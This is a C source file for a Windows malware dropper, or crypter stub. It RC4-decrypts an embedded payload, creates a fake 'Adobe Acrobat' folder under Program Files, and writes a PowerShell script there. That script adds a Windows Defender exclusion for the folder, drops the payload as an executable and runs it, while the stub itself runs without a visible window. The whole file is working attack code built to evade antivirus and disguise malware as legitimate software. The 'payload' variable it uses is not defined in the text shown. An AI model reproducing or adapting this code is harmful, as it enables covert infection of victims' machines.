#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <sys/stat.h>

#define SWAP(a, b) { uint8_t temp = a; a = b; b = temp; }
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static const char base64_chars[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

char* getStringFromFile(const char* filePath);
char* removeFirstLine(char** input);
void removeNewlines(char *str);
static inline int base64_char_to_val(char c);
unsigned char* base64_to_bytes(const char* data, size_t *output_length);
void rc4_init(uint8_t *key, size_t key_length, uint8_t *state);
void rc4_crypt(uint8_t *data, size_t data_length, uint8_t *state, uint8_t *output);
int saveBytesToFile(const char* filePath, const unsigned char* bytes, size_t size);
char* encode_base64(const unsigned char* data, size_t input_length, size_t* output_length);
int saveStringToFile(const char *filepath, const char *content);
void splitString(const char *input, char **firstPart, char **secondPart);
int getProgramFilesPath(char *pathBuffer, DWORD bufferSize);
char* appendStrings(const char* str1, const char* str2);
int ensureFolderExists(const char *path);

// gcc stub2.c resource.res -o stub2.exe -mwindows
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {
// int main() {
  
    // split key from payload
    char *key = NULL;
    char *payloadStr = NULL;
    splitString(payload, &key, &payloadStr);

    // convert from base64 to bytes
    size_t payloadBytesEncryptedSize;
    unsigned char* payloadBytesEncrypted = base64_to_bytes(payloadStr, &payloadBytesEncryptedSize);
    // printf("Size: %d bytes\n", payloadBytesEncryptedSize);
    // printf("%s\n", payloadBytesEncryptedSize);

    // decrypt bytes
    unsigned char decrypted[payloadBytesEncryptedSize];
    unsigned char state[256];
    rc4_init(key, strlen(key), state);
    rc4_crypt(payloadBytesEncrypted, payloadBytesEncryptedSize, state, decrypted);
    // printf("Decrypted: ");
    // for (size_t i = 0; i < payloadBytesEncryptedSize; i++) {
    //     printf("%c", decrypted[i]);
    // }
    // printf("\n");


    size_t output_length;
    char* encoded = encode_base64(decrypted, payloadBytesEncryptedSize, &output_length);
    // if (encoded) {
    //     printf("Base64 Encoded: \n%s\n", encoded);
        
    // } else {
    //     printf("Failed to encode data\n");
    // }

    // get program files path
    char programFilesPath[MAX_PATH];
    if (getProgramFilesPath(programFilesPath, MAX_PATH)) {
        printf("Program Files path: %s\n", programFilesPath);
    } else {
        printf("Failed to get Program Files path\n");
    }

    // create directory
    char* newFolderInProgramFiles = "\\Adobe Acrobat";
    char* saveFilePath = appendStrings(programFilesPath, newFolderInProgramFiles);
    // Call the function with the desired folder path
    if (ensureFolderExists(saveFilePath) == 0) {
        printf("Folder creation successful.\n");
    } else {
        printf("Folder creation failed.\n");
    }

    char formattedString[output_length+200]; // Adjust the size as necessary to fit your content

    // char inScriptPath[MAX_PATH];
    // GetCurrentDirectory(MAX_PATH, inScriptPath);
    // // printf("%s\n", inScriptPath);
    // strcat(inScriptPath, "\\data\\program.exe");



    // Using sprintf to create the string with placeholders for base64bytes and filePath
    char* programPath = appendStrings(saveFilePath, "\\example.exe");
    sprintf(formattedString, 
            "Add-MpPreference -ExclusionPath \"%s\"\n"
            "$data = \"%s\"\n"
            "$dataBase64Bytes = [Convert]::FromBase64String($data)\n"
            "[System.IO.File]::WriteAllBytes(\"%s\", $dataBase64Bytes)\n"
            "& \"%s\"", 
            saveFilePath, encoded, programPath, programPath);

    // Printing the result to verify it
    // printf("%s\n", formattedString);


    // save to disk
    char* scriptPath = appendStrings(saveFilePath, "\\config.ps1");
    // char *filePathPSscript = "data/program.ps1";
    saveStringToFile(scriptPath, formattedString);
    char* temp5 = appendStrings("powershell -File \"", scriptPath);
    char* command = appendStrings(temp5, "\"");
    // char* command = "powershell -File data/program.ps1";
    system(command);


    free(payloadStr);
    free(key);
    free(encoded);

    return 0;
}


// Function to check if folder exists and create it if it doesn't
int ensureFolderExists(const char *path) {
    struct stat st = {0};

    // Check if the folder exists
    if (stat(path, &st) == -1) {
        // Folder does not exist, attempt to create it
        if (mkdir(path, 0700) == -1) { // 0700 permissions - rwx for owner only
            perror("Error creating directory");
            return -1; // Return an error if folder creation fails
        }
        printf("Folder \"%s\" created successfully.\n", path);
    } else {
        printf("Folder \"%s\" already exists.\n", path);
    }
    return 0; // Success
}

int getProgramFilesPath(char *pathBuffer, DWORD bufferSize) {
    DWORD pathSize;

    // Attempt to retrieve the path size
    pathSize = GetEnvironmentVariable("ProgramFiles", pathBuffer, bufferSize);

    if (pathSize == 0 || pathSize > bufferSize) {
        // If the function fails, or buffer is too small, the return value is zero.
        return 0; // Indicate failure
    }

    return 1; // Indicate success
}

char* appendStrings(const char* str1, const char* str2) {
    // Calculate the length of the new string
    size_t length = strlen(str1) + strlen(str2) + 1; // +1 for the null terminator

    // Allocate memory for the new string
    char* result = (char*)malloc(length);
    
    if (result == NULL) {
        printf("Memory allocation failed\n");
        return NULL; // Return NULL if memory allocation fails
    }

    // Copy the first string into result
    strcpy(result, str1);
    
    // Append the second string to result
    strcat(result, str2);
    
    // Return the dynamically allocated, concatenated string
    return result;
}

// Function definition
void splitString(const char *input, char **firstPart, char **secondPart) {
    size_t inputLen = strlen(input);
    size_t firstPartLen = inputLen > 64 ? 64 : inputLen;

    // Allocate memory for the first part (+1 for the null terminator)
    *firstPart = (char *)malloc(firstPartLen + 1);
    strncpy(*firstPart, input, firstPartLen);
    (*firstPart)[firstPartLen] = '\0'; // Ensure null-termination

    // Allocate memory for the second part and copy the rest of the string
    if (inputLen > 64) {
        *secondPart = (char *)malloc(inputLen - firstPartLen + 1);
        strncpy(*secondPart, input + firstPartLen, inputLen - firstPartLen);
        (*secondPart)[inputLen - firstPartLen] = '\0'; // Ensure null-termination
    } else {
        // If the input string is shorter than or equal to 64 characters,
        // the second part is an empty string.
        *secondPart = (char *)malloc(1);
        **secondPart = '\0';
    }
}


int saveStringToFile(const char *filepath, const char *content) {
    FILE *file = fopen(filepath, "w"); // Open the file for writing. If the file does not exist, it will be created.
    if (file == NULL) {
        perror("Error opening file"); // Print the error message to stderr.
        return -1; // Return an error code.
    }

    if (fputs(content, file) == EOF) { // Write the content to the file.
        perror("Error writing to file"); // Print the error message to stderr if writing fails.
        fclose(file); // Close the file to free resources.
        return -1; // Return an error code.
    }

    fclose(file); // Close the file to free resources.
    return 0; // Return 0 to indicate success.
}


// Function to encode a byte array to a base64 string
char* encode_base64(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(*output_length + 1);
    if (encoded_data == NULL) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = b64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 0 * 6) & 0x3F];
    }

    for (size_t i = 0; i < *output_length % 4; ++i) {
        encoded_data[*output_length - 1 - i] = '=';
    }

    encoded_data[*output_length] = '\0';
    return encoded_data;
}



int saveBytesToFile(const char* filePath, const unsigned char* bytes, size_t size) {
    FILE *file = fopen(filePath, "wb"); // Open the file for writing in binary mode
    if (file == NULL) {
        perror("Error opening file");
        return -1; // Return error code if file cannot be opened
    }

    size_t written = fwrite(bytes, sizeof(unsigned char), size, file);
    if (written < size) {
        perror("Error writing to file");
        fclose(file); // Always close the file descriptor
        return -2; // Return error code if not all bytes were written
    }

    fclose(file); // Always close the file descriptor
    return 0; // Success
}

// Function to initialize the state array
void rc4_init(uint8_t *key, size_t key_length, uint8_t *state) {
    for (int i = 0; i < 256; i++) {
        state[i] = i;
    }

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + state[i] + key[i % key_length]) % 256;
        SWAP(state[i], state[j]);
    }
}

// Function to generate RC4 stream and encrypt or decrypt data
void rc4_crypt(uint8_t *data, size_t data_length, uint8_t *state, uint8_t *output) {
    int i = 0, j = 0;
    for (size_t n = 0; n < data_length; n++) {
        i = (i + 1) % 256;
        j = (j + state[i]) % 256;
        SWAP(state[i], state[j]);
        uint8_t rnd = state[(state[i] + state[j]) % 256];
        output[n] = rnd ^ data[n];
    }
}

// Function to find the index of a Base64 character in the encoding table.
static inline int base64_char_to_val(char c) {
    const char *p = strchr(base64_chars, c);
    if (p) {
        return p - base64_chars;
    } else {
        return -1; // Should ideally handle this error properly
    }
}

unsigned char* base64_to_bytes(const char* data, size_t *output_length) {
    size_t input_length = strlen(data);
    if (input_length % 4 != 0) return NULL; // Base64 string length should be divisible by 4

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        int sextet_a = data[i] == '=' ? 0 & i++ : base64_char_to_val(data[i++]);
        int sextet_b = data[i] == '=' ? 0 & i++ : base64_char_to_val(data[i++]);
        int sextet_c = data[i] == '=' ? 0 & i++ : base64_char_to_val(data[i++]);
        int sextet_d = data[i] == '=' ? 0 & i++ : base64_char_to_val(data[i++]);

        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;

        if (j < *output_length) decoded_data[j++] = (triple >> 16) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = triple & 0xFF;
    }

    return decoded_data;
}


// Function to remove all newline characters from a string
void removeNewlines(char *str) {
    if (str == NULL) return; // Check for NULL pointer

    char *src = str, *dst = str;
    while (*src) {
        if (*src != '\n') { // Copy only if it's not a newline
            *dst++ = *src;
        }
        src++;
    }
    *dst = '\0'; // Null-terminate the modified string
}


char* removeFirstLine(char** input) {
    char* original = *input; // Pointer to the original input string
    char* newlinePos = strchr(original, '\n'); // Find the first newline character
    
    // If there's no newline, return NULL and leave the original string unchanged
    if (newlinePos == NULL) {
        return NULL;
    }

    // Calculate the length of the first line not including the newline
    size_t firstLineLength = newlinePos - original;
    
    // Allocate memory for the first line (+1 for the null terminator)
    char* firstLine = (char*)malloc(firstLineLength + 1);
    if (firstLine == NULL) { // Check if malloc failed
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    // Copy the first line into the new string
    strncpy(firstLine, original, firstLineLength);
    firstLine[firstLineLength] = '\0'; // Null-terminate the string

    // Adjust the original input pointer to skip the first line and the newline
    *input = newlinePos + 1;

    return firstLine;
}

char* getStringFromFile(const char* filePath) {
    FILE *file = fopen(filePath, "r"); // Open the file for reading
    char *string = NULL;
    if (file == NULL) {
        printf("Failed to open the file.\n");
        return NULL; // Return NULL if the file cannot be opened
    }

    // Seek to the end of the file to determine its size
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file); // Go back to the start of the file

    // Allocate memory for the file content plus a null terminator
    string = (char *)malloc(fileSize + 1);
    if (string == NULL) {
        printf("Failed to allocate memory.\n");
        fclose(file);
        return NULL; // Return NULL if memory allocation fails
    }

    // Read the file into the string
    size_t bytesRead = fread(string, 1, fileSize, file);
    if (bytesRead < fileSize) {
        printf("Failed to read the file.\n");
        free(string);
        fclose(file);
        return NULL; // Return NULL if reading fails
    }

    // Null-terminate the string
    string[bytesRead] = '\0';

    fclose(file); // Close the file
    return string; // Return the string
}